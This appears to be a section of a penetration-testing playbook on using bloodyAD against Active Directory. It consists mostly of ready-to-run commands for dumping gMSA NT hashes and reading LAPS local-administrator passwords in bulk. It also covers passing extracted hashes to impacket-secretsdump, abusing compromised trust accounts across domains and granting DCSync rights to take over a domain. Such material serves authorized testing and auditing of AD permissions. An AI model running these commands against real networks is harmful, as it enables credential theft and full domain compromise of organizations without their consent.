# 08.05 bloodyAD gMSA LAPS Trust Operations

> Read gMSA (`msDS-ManagedPassword`), legacy LAPS (`ms-Mcs-AdmPwd`), and new LAPS (`msLAPS-Password`) blobs directly via `bloodyAD`.

## Overview

bloodyAD natively reads gMSA passwords (msDS-ManagedPassword blob), LAPS passwords (ms-Mcs-AdmPwd), and new Windows LAPS (msLAPS-Password). These require specific ACEs but are often misconfigured. Cross-domain operations target inter-forest LDAP.

## Steps

- gMSA msDS-ManagedPassword is a binary blob; bloodyAD decodes it automatically to show NT hash
- LAPS ms-Mcs-AdmPwd stores local admin password in cleartext — read with get object
- Windows LAPS (2023+) stores encrypted in msLAPS-EncryptedPassword; cleartext in msLAPS-Password
- Check who can read LAPS: Get-LAPSPermissions.ps1 or check nTSecurityDescriptor ACEs
- Cross-domain: use -d TARGETDOMAIN and --host TARGET_DC_IP with valid cross-domain credentials
- Trust password abuse: with trust account creds, enumerate foreign domain via LDAP

## Commands

### Read gMSA password (msDS-ManagedPassword)

```bash
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get object gmsaaccount$ --attr msDS-ManagedPassword
# bloodyAD decodes the blob and shows NT hash:
# msDS-ManagedPassword: {NT: aad3b435b51404eeaad3b435b51404ee:<nthash>}
# Then PTH with the extracted hash:
impacket-secretsdump -hashes :<nthash> DOMAIN/gmsaaccount$@TARGET_IP
```

### Read legacy LAPS password (ms-Mcs-AdmPwd)

```bash
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get object COMPUTER$ --attr ms-Mcs-AdmPwd
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get object COMPUTER$ --attr ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
# Bulk — check all computers with LAPS set:
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get search --filter '(ms-Mcs-AdmPwd=*)' --attr dNSHostName,ms-Mcs-AdmPwd
```

### Read Windows LAPS (msLAPS-Password)

```bash
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get object COMPUTER$ --attr msLAPS-Password
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get object COMPUTER$ --attr msLAPS-EncryptedPassword
# Bulk:
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get search --filter '(msLAPS-Password=*)' --attr dNSHostName,msLAPS-Password
```

### Cross-domain enumeration (with trust creds)

```bash
# After compromising trust account or with cross-domain user:
bloodyAD -u crossdomainuser -p pass -d TARGETDOMAIN --host TARGET_DC_IP get object Administrator
bloodyAD -u crossdomainuser -p pass -d TARGETDOMAIN --host TARGET_DC_IP get writable --otype user
bloodyAD -u crossdomainuser -p pass -d TARGETDOMAIN --host TARGET_DC_IP add dcsync crossdomainuser
```

### Check ACEs on LAPS-enabled computers

```bash
# Enumerate who has ReadLAPSPassword right:
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get search --filter '(ms-Mcs-AdmPwdExpirationTime=*)' --attr sAMAccountName,nTSecurityDescriptor
```
